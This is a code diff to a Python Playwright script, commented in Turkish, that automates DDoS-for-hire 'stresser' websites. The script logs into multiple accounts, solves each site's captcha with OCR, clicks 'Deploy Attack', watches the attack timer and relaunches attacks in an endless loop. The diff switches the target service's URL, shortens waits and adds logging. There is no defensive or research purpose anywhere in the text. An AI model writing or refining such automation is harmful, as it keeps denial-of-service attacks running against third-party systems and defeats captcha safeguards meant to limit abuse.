@@ -13,7 +13,7 @@ from PIL import Image
 import ddddocr
 
 # ============================================================
-# LOG AYARLARI - SADE VE OKUNABİLİR
+# LOG AYARLARI
 # ============================================================
 LOG_DIR = "logs"
 if not os.path.exists(LOG_DIR):
@@ -21,22 +21,13 @@ if not os.path.exists(LOG_DIR):
 
 log_filename = f"{LOG_DIR}/ddos_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
 
-class CleanFormatter(logging.Formatter):
-    def format(self, record):
-        msg = record.getMessage()
-        # Sadece önemli logları göster, gereksizleri filtrele
-        if any(x in msg for x in ["OCR çok kısa", "Captcha src geçersiz", "Captcha image yok"]):
-            return ""
-        return f"{record.asctime} | {msg}"
-
-handler = logging.StreamHandler(sys.stdout)
-handler.setFormatter(logging.Formatter('%(asctime)s | %(message)s', datefmt='%H:%M:%S'))
-
 logging.basicConfig(
     level=logging.INFO,
+    format='%(asctime)s | %(message)s',
+    datefmt='%H:%M:%S',
     handlers=[
         logging.FileHandler(log_filename, encoding='utf-8'),
-        handler
+        logging.StreamHandler(sys.stdout)
     ]
 )
 logger = logging.getLogger(__name__)
@@ -48,7 +39,7 @@ ocr = ddddocr.DdddOcr()
 # ============================================================
 class DDoSNowManager:
     def __init__(self):
-        self.base_url = "https://ipbooter.ba"
+        self.base_url = "https://stresser.ba"
         self.accounts = self.load_accounts()
         self.running_states = {}
         self.stop_events = {}
@@ -74,28 +65,25 @@ class DDoSNowManager:
         return accounts
 
     def is_login_page(self, page):
-        """URL'de /login var mı?"""
         return "/login" in page.url
 
     def do_login(self, page, username, password):
-        """Login sayfasındaysa giriş yap"""
         try:
             logger.info(f"[{username}] 🔐 Login yapılıyor...")
             page.goto(f"{self.base_url}/login", timeout=60000)
-            page.wait_for_load_state("networkidle", timeout=30000)
-            time.sleep(2)
+            page.wait_for_load_state("domcontentloaded", timeout=30000)
+            time.sleep(1)
 
-            page.fill("input[name='username']", username, timeout=10000)
-            page.fill("input[name='password']", password, timeout=10000)
-            page.click("button[type='submit']", timeout=10000)
-            time.sleep(4)
+            page.fill("input[name='username']", username, timeout=15000)
+            page.fill("input[name='password']", password, timeout=15000)
+            page.click("button[type='submit']", timeout=15000)
+            time.sleep(3)
 
-            # Cookie banner
             try:
                 got_it = page.locator("button:has-text('Got it')").first
                 if got_it.count() > 0:
                     got_it.click()
-                    time.sleep(1)
+                    time.sleep(0.5)
             except:
                 pass
 
@@ -105,11 +93,10 @@ class DDoSNowManager:
             return False
 
     def go_to_hub(self, page, username):
-        """Hub sayfasına git"""
         try:
             page.goto(f"{self.base_url}/hub", timeout=60000)
-            page.wait_for_load_state("networkidle", timeout=30000)
-            time.sleep(2)
+            page.wait_for_load_state("domcontentloaded", timeout=30000)
+            time.sleep(1)
 
             if self.is_login_page(page):
                 logger.warning(f"[{username}] ⚠️ Hub'a giderken login düşüldü!")
@@ -122,34 +109,39 @@ class DDoSNowManager:
             return False
 
     def solve_captcha(self, page, username, max_attempts=10):
-        """
-        Captcha çöz. 
-        Her denemede YENİ image al. 
-        10 kez hatalıysa False dön.
-        """
+        """Captcha çöz - HIZLI, tüm denemeler loglanır, aynı image atlanır"""
+        seen_images = set()  # Aynı captcha tekrar okunmasın
+
         for attempt in range(1, max_attempts + 1):
             try:
-                # 🔥 HER DENEMEDE YENİ LOCATOR AL - ESKİ KALMAMIŞ IMAGE'I YAKALA
                 img_elem = page.locator("img[alt='captcha']").first
                 if img_elem.count() == 0:
-                    time.sleep(1)
+                    logger.warning(f"[{username}] 🔑 OCR deneme {attempt}/{max_attempts}: Captcha image yok")
+                    time.sleep(0.5)
                     continue
 
                 img_src = img_elem.get_attribute("src")
                 if not img_src or not img_src.startswith("data:image"):
+                    logger.warning(f"[{username}] 🔑 OCR deneme {attempt}/{max_attempts}: Captcha src geçersiz")
+                    time.sleep(0.5)
+                    continue
+
+                # Aynı image tekrar okunmasın
+                if img_src in seen_images:
+                    logger.warning(f"[{username}] 🔑 OCR deneme {attempt}/{max_attempts}: Aynı image tekrar, bekleniyor...")
                     time.sleep(1)
                     continue
+                seen_images.add(img_src)
 
                 base64_data = re.sub(r'^data:image/\w+;base64,', '', img_src)
                 img_bytes = base64.b64decode(base64_data)
                 img = Image.open(io.BytesIO(img_bytes))
 
-                # 🔥 PREPROCESS YOK - ddddocr ham haliyle en iyisini yapar
                 captcha_text = ocr.classification(img)
                 captcha_text = re.sub(r'[^A-Z0-9]', '', captcha_text.upper())
 
-                # Eğer boşsa veya çok kısaysa atla ama loglama (gereksiz log kalabalığı)
-                if len(captcha_text) < 4:
+                if len(captcha_text) < 3:
+                    logger.warning(f"[{username}] 🔑 OCR deneme {attempt}/{max_attempts}: Çok kısa sonuç '{captcha_text}'")
                     time.sleep(0.5)
                     continue
 
@@ -157,7 +149,8 @@ class DDoSNowManager:
 
                 captcha_input = page.locator("input[name='captcha']").first
                 if captcha_input.count() == 0:
-                    time.sleep(1)
+                    logger.warning(f"[{username}] 🔑 OCR deneme {attempt}/{max_attempts}: Input yok")
+                    time.sleep(0.5)
                     continue
 
                 captcha_input.fill("")
@@ -169,21 +162,21 @@ class DDoSNowManager:
                 if deploy_btn.count() == 0:
                     deploy_btn = page.locator("button.btn-confirm:has-text('Deploy Attack')").last
                 if deploy_btn.count() == 0:
-                    time.sleep(1)
+                    logger.warning(f"[{username}] 🔑 OCR deneme {attempt}/{max_attempts}: Deploy butonu yok")
+                    time.sleep(0.5)
                     continue
 
                 deploy_btn.click()
-                time.sleep(2.5)
+                time.sleep(1.5)  # Mesajların çıkması için kısa bekle
 
                 # Hata mesajı var mı?
                 if page.locator("text=Invalid captcha code").count() > 0:
-                    logger.warning(f"[{username}] ❌ YANLIŞ: {captcha_text}")
-                    # Eski mesajı temizle
+                    logger.warning(f"[{username}] ❌ YANLIŞ: {captcha_text} (deneme {attempt})")
                     try:
                         page.locator("text=Invalid captcha code").first.evaluate("el => el.remove()")
                     except:
                         pass
-                    time.sleep(1)
+                    time.sleep(0.5)
                     continue
 
                 # Başarı mesajı var mı?
@@ -191,20 +184,21 @@ class DDoSNowManager:
                     logger.info(f"[{username}] ✅ DOĞRU: {captcha_text} | Attack başlatıldı!")
                     return True
 
-                # Badge var mı? (Running durumu)
+                # Badge var mı?
                 badge = page.locator(".accordion-button .badge").first
                 running = page.locator(".stats-content .badge:has-text('Running')").first
                 if badge.count() > 0 or running.count() > 0:
                     logger.info(f"[{username}] ✅ DOĞRU: {captcha_text} | Attack aktif!")
                     return True
 
-                # Belirsiz durum - yeniden dene
-                time.sleep(1)
+                # Belirsiz - yeniden dene
+                logger.warning(f"[{username}] 🔑 OCR deneme {attempt}/{max_attempts}: Belirsiz durum, yeniden deneniyor")
+                time.sleep(0.5)
                 continue
 
             except Exception as e:
                 logger.error(f"[{username}] ⚠️ Captcha exception (deneme {attempt}): {e}")
-                time.sleep(2)
+                time.sleep(1)
                 continue
 
         logger.error(f"[{username}] 💀 {max_attempts} deneme sonucu captcha çözülemedi!")
@@ -231,7 +225,7 @@ class DDoSNowManager:
                         args=[
                             '--no-sandbox',
                             '--disable-setuid-sandbox',
-                            '--disable-dev-shm-usage',  # 🔥 RAM sorunu çözümü
+                            '--disable-dev-shm-usage',
                             '--disable-gpu',
                             '--disable-software-rasterizer'
                         ],
@@ -288,7 +282,7 @@ class DDoSNowManager:
                             except PlaywrightTimeout:
                                 logger.error(f"[{username}] ❌ Süre input açılmadı! Yenileniyor...")
                                 page.reload()
-                                time.sleep(5)
+                                time.sleep(3)
                                 continue
 
                             time_input.fill("")
@@ -306,27 +300,29 @@ class DDoSNowManager:
                                 time.sleep(3)
                                 continue
                             deploy_btn.click()
-                            time.sleep(2)
+                            time.sleep(1)
 
                             # 4. Captcha çöz
                             if not self.solve_captcha(page, username, max_attempts=10):
                                 logger.error(f"[{username}] 💀 Captcha başarısız! Sayfa yenileniyor...")
                                 page.reload()
-                                time.sleep(5)
+                                time.sleep(3)
                                 continue
 
                             logger.info(f"[{username}] 🚀 Attack #{attack_count} BAŞLADI!")
 
-                            # 5. Süre takibi - sadece 30sn'de bir log
+                            # 🔥 BEKLE: Attack'ın DOM'a yansıması için 5 saniye bekle
+                            time.sleep(5)
+
+                            # 5. Süre takibi
                             while self.running_states.get(acc_id, False) and not (stop_event and stop_event.is_set()):
                                 try:
                                     badge = page.locator(".accordion-button .badge").first
                                     if badge.count() > 0:
                                         t = badge.text_content().strip()
-                                        if t in ["0m 0s", "0s", "0"]:
+                                        if not t or t in ["0m 0s", "0s", "0", ""]:
                                             logger.info(f"[{username}] ⏱️ Süre doldu!")
                                             break
-                                        # Sadece 30sn'de bir log
                                         now = time.time()
                                         if now - last_time_log >= 30:
                                             logger.info(f"[{username}] ⏱️ Kalan: {t}")
@@ -334,9 +330,14 @@ class DDoSNowManager:
                                     else:
                                         running = page.locator(".stats-content .badge:has-text('Running')").first
                                         if running.count() == 0:
-                                            logger.info(f"[{username}] ✅ Attack bitti!")
-                                            break
-                                except:
+                                            # Henüz başlamamış olabilir, 3 sn daha bekle
+                                            time.sleep(3)
+                                            running = page.locator(".stats-content .badge:has-text('Running')").first
+                                            if running.count() == 0:
+                                                logger.info(f"[{username}] ✅ Attack bitti!")
+                                                break
+                                except Exception as e:
+                                    logger.warning(f"[{username}] ⚠️ Süre takip hatası: {e}")
                                     pass
                                 time.sleep(5)
 
@@ -346,9 +347,8 @@ class DDoSNowManager:
                             # 6. Yeniden başlat
                             logger.info(f"[{username}] 🔄 Yeniden başlatılıyor...")
                             page.reload()
-                            time.sleep(5)
+                            time.sleep(3)
 
-                            # Reload sonrası login kontrolü
                             if self.is_login_page(page):
                                 logger.warning(f"[{username}] ⚠️ Reload sonrası login düşüldü! Yeniden giriş...")
                                 if not self.do_login(page, username, password):
